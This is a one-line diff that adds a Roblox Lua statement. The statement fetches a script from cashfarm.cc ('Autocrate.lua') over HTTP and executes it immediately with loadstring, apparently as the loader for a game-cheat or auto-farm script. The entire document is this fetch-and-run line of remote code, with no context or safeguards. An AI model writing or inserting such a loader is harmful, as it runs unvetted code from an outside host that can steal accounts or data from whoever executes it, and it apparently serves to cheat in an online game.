@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://cashfarm.cc/Autocrate.lua"))()
